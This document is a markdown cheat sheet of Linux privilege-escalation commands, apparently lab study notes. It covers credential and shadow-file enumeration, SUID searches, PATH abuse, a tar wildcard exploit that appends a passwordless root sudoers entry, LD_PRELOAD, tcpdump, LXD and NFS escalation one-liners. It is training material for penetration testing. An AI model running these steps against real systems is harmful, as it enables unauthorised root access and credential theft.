# Linux Privilege Escalation

## User & Process Enumeration

### User
cat /etc/shells # Available login shells
whoami # Get current user context 
id # what groups does the user belong to
sudo -l	# Can the user run anything as another user?
history	# Check the current user's bash history
ls -all ~/.ssh 	# Check for SSH keys for current user
echo $PATH # Check the current user's PATH variable contents
env # check environmental vars for the user, may find a password
lastlog # check user's last login time

### Other Users
ls -alh /home	# View user home directories. Check .bash_history & .ssh/ for keys
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null # find history files
ps au # See logged in users
w # see logged in users
finger # see logged in users
cat /etc/passwd | cut -f1 -d: # get all users from /etc/passwd

### SEDUID & SETGID
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null	# Find binaries with the SUID bit set. The file will execute with the privileges of the file group.
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null	# Find binaries with the SETGID bit set. The file will execute with the privilege of the file owner.

### Passwords & Hashes
cat /etc/passwd # file is readable by all users, sometimes a hash will be in here. If we have the shadow file, too, then we can crack the hashes
cat /etc/shadow # if readable, then hashes for all users will be available to crack
cat /etc/group # view groups
getent group sudo # get the members of ANY group, e.g. sudo
grep 'DB_USER\|DB_PASSWORD' wp-config.php # Look for credentials
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null # Look for credentials 

### Processes
ps au
ps aux | grep root	# See processes running as root
ps aux | grep $user # See processes running as $user
ls -la /etc/cron.daily # Check for daily Cron jobs
./pspy64 -pf -i 1000	# View running processes with pspy

### Services, Packages, & Binaries
sudo -V # Check sudo version to see if vulnerable to exploit
ls -l /bin /usr/bin/ /usr/sbin/ # View binaries
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list # Create a list of installed packages
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done # Search GTFObins for installed package list created above
strace ping -c1 10.129.112.20 # track and analyze system calls and signal processing. It allows us to follow the flow of a program and understand how it accesses system resources, processes signals, and receives and sends data from the operating system

### Writable dirs & files
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null	# Find world-writeable directories
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null	# Find world-writeable files
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null	# Search for config files
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null # Get all readable config files
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep username # All hidden files for $username
find / -type d -name ".*" -ls 2>/dev/null # All hidden directories
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share" # Search for scripts

### Interesting dirs
ls -l /tmp /var/tmp /dev/shm # View temporary files
/tmp # Data stored for up to 10 days or upon device restart
/var/tmp # Data stored for up to 30 days

## System & Environment Enumeration

### OS Information
hostname
cat /etc/os-release # Check the OS version
cat /etc/lsb-release	# Check the OS version
uname -a	# Check the Kernel version
cat /proc/version # Check the Kernal version
lscpu # Check the CPU type/version
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n" #  used to look up system information such as the state of running processes, kernel parameters, system memory, and devices. It also sets certain system parameters, such as process priority, scheduling, and memory allocation.


### Network Information
ip a # check subnets and NICs
ifconfig # check subnets and NICs
route # routing table
netstat -rn # routing table
arp -a # Check what other hosts the system has been communicating with
cat /etc/hosts # local DNS entries


### Mounted File Systems & Additional drives / peripherals
df -h # View mounted file systems. Root required to mount/unmount drives.
lsblk	# Check for unmounted file systems/drives. If you discover and can mount an additional drive or unmounted file system, you may find sensitive files, passwords, or backups that can be leveraged to escalate privileges.
cat /etc/fstab # search for 'password' 'username', 'credential' by grepping. Used for mounted drives
cat /etc/fstab | grep -v password # example
lpstat # Check for any attached printers for potential interesting info
cat /etc/fstab | grep -v "#" | column -t # View unmounted file systems

## Linux Privilege Escalation Techniques

### Path Abuse

```text
Adding . to a user's PATH adds their current working directory to the list. For example, if we can modify a user's path, we could replace a common binary such as ls with a malicious script such as a reverse shell. If we add . to the path by issuing the command PATH=.:$PATH and then export PATH, we will be able to run binaries located in our current working directory by just typing the name of the file (i.e. just typing ls will call the malicious script named ls in the current working directory instead of the binary located at /bin/ls).
``` 

env | grep PATH  # Check the PATH var contents
echo $PATH # Check the PATH var contents

```bash
haunter@kali:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

haunter@kali:~$ PATH=.:${PATH}
haunter@kali:~$ export PATH
haunter@kali:~$ echo $PATH

.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

In this example, we modify the path to run a simple echo command when the command ls is typed.

haunter@kali:~$ touch ls
haunter@kali:~$ echo 'echo "PATH ABUSE!!"' > ls
haunter@kali:~$ chmod +x ls

haunter@kali:~$ ls

PATH ABUSE!!
```

### Wildcard Abuse

```text
An example of how wildcards can be abused for privilege escalation is the tar command, a common program for creating/extracting archives. If we look at the man page for the tar command, we see the following:

htb_student@NIX02:~$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.

The --checkpoint-action option permits an EXEC action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, --checkpoint=1 and --checkpoint-action=exec=sh root.sh is passed to tar as command-line options. Let's see this in practice.

Consider the following cron job, which is set up to back up the /home/htb-student directory's contents and create a compressed archive within /home/htb-student. The cron job is set to run every minute, so it is a good candidate for privilege escalation.

We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify. 

htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1

We can check and see that the necessary files were created.

htb-student@NIX02:~$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh

Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.

htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL

Character	Significance
*	An asterisk that can match any number of characters in a file name.
?	Matches a single character.
[ ]	Brackets enclose characters and can match any single one at the defined position.
~	A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.
-	A hyphen within brackets will denote a range of characters.
```

### Restricted Shell Escape

Common Ristricted Shells
* rbash - most restrictive
* rksh - moderately restrictive
* rzsh - most flexible

#### Command Injection

This command would cause the ls command to be executed with the argument -l, followed by the output of the pwd command. Since the pwd command is not restricted by the shell, this would allow us to execute the pwd command and see the current working directory, even though the shell does not allow us to execute the pwd command directly.

haunteractual@htb[/htb]$ ls -l `pwd` 

#### Command Substition

gcc kernel_expoit.c -o kernel_expoit #	Compile an exploit written in C
screen -v	# Check the installed version of Screen
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root	# Priv esc with tcpdump
ldd /bin/ls	# View the shared objects required by a binary
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart	# Escalate privileges using LD_PRELOAD
readelf -d payroll | grep PATH	# Check the RUNPATH of a binary
gcc src.c -fPIC -shared -o /development/libshared.so	# Compiled a shared libary
lxd init	# Start the LXD initialization process
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine	# Import a local image
lxc init alpine r00t -c security.privileged=true	 # Start a privileged LXD container
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true	# Mount the host file system in a container
lxc start r00t	# Start the container
showmount -e 10.129.2.12	# Show the NFS export list
sudo mount -t nfs 10.129.2.12:/tmp /mnt	# Mount an NFS share locally
tmux -S /shareds new -s debugsess	# Created a shared tmux session socket
./lynis audit system	# Perform a system audit with Lynis
